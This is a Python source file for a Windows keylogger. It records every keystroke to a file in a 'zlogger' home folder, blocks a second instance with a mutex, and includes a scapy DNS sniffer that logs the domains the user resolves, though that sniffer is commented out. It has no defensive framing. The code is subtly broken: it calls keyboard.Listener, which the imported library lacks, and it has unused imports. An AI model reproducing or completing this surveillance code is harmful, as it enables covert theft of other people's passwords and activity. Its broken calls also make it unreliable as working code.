import socket

import os

import win32event
import win32api
import winerror

import datetime
import loguru
import logbook
import logging
import logging.handlers
import keyboard

import netifaces
import winreg

import scapy.all as scapy


# get the user name as identifier
def user_name():
    user_name = str(socket.gethostname())
    return user_name


# Define a function to get the name of an interface from its GUID
def get_interface_name(guid):
    # Open the registry key that contains the mapping
    reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
    key = winreg.OpenKey(reg, r'SYSTEM\CurrentControlSet\Control\Network\{4d36e972-e325-11ce-bfc1-08002be10318}')
    # Try to get the subkey that corresponds to the GUID
    try:
        subkey = winreg.OpenKey(key, guid + r'\Connection')
        # Try to get the value that contains the name
        try:
            name = winreg.QueryValueEx(subkey, 'Name')[0]
            # Return the name
            return name
        except FileNotFoundError:
            # If the value is not found, return None
            return None
    except FileNotFoundError:
        # If the subkey is not found, return None
        return None


#Getting current active network interface
def active_interface():
    active_interface = get_interface_name(netifaces.gateways()['default'][netifaces.AF_INET][1])
    return active_interface


#For creating app dir
def dir_path():
    home_path = os.path.expanduser("~")
    dir_name = "zlogger"
    dir_path = os.path.join(home_path, dir_name)
    if not os.path.exists(dir_path):
        os.makedirs(dir_path)
    os. chdir(dir_path)
    return dir_path


# get the current date and time as a string
def current_time():
    current_time = datetime.datetime.now().strftime('-%Y-%m-%d-%H-%M-%S')
    return current_time

#disallowing multiple instance
def disable_multiple_instance():
    mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        mutex = None
        print ("Multiple Instance not Allowed")
        exit(0)
    x=''
    data=''
    count=0

# check if internet is connected or not
def is_connected():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        pass
    return False


# define a function that runs the keylogger in a separate thread
def key_logger():
    # create a logging handler that writes to a file with a constant name
    log_handler = logging.FileHandler("keylogs.txt")
    # create a logging formatter that specifies the format of the log messages
    log_formatter = logging.Formatter("%(asctime)s - %(message)s")
    # set the formatter for the handler
    log_handler.setFormatter(log_formatter)
    # create a logging logger that uses the handler
    logger = logging.getLogger("KeyLogger")
    logger.addHandler(log_handler)
    # define a function that logs the pressed keys
    def log_key(event):
        # get the name of the pressed key
        key = event.name
        # write the key name to the log file using the logger
        logger.info(key)
    # create a listener object that listens to keyboard events and passes the logger to the callback function
    listener = keyboard.Listener(on_press=log_key)
    # start the listener in a new thread
    listener.start()
    # join the listener thread to the main thread
    listener.join()






#dns logger
def dns_logger():
    # Set up the logging configuration
    logging.basicConfig(filename='dnslog-'+user_name()+current_time()+'.txt', filemode='a', format='%(asctime)s %(message)s', datefmt='%Y-%m-%d %H:%M:%S', level=logging.INFO)
    # Define a function to process each packet
    def process_packet(packet):
        # Check if the packet has a DNS layer and a DNS response
        if packet.haslayer(scapy.DNS) and packet[scapy.DNS].qr == 1:
            # Check if the packet has any answers in the DNS response
            if packet[scapy.DNS].an is not None:
                # Loop through each answer in the DNS response
                for answer in packet[scapy.DNS].an:
                    # Check if the answer is an A record
                    if answer.type == 1:
                        # Get the domain name and the IP address from the answer
                        domain = answer.rrname.decode('utf-8')
                        ip = answer.rdata
                        # Log the domain name and the IP address
                        logging.info(f'A record: {domain} -> {ip}')

    # Sniff packets on the network interface and pass them to the process_packet function
    scapy.sniff(iface=active_interface(), store=False, prn=process_packet)


# dir_path()
key_logger()
# dns_logger()






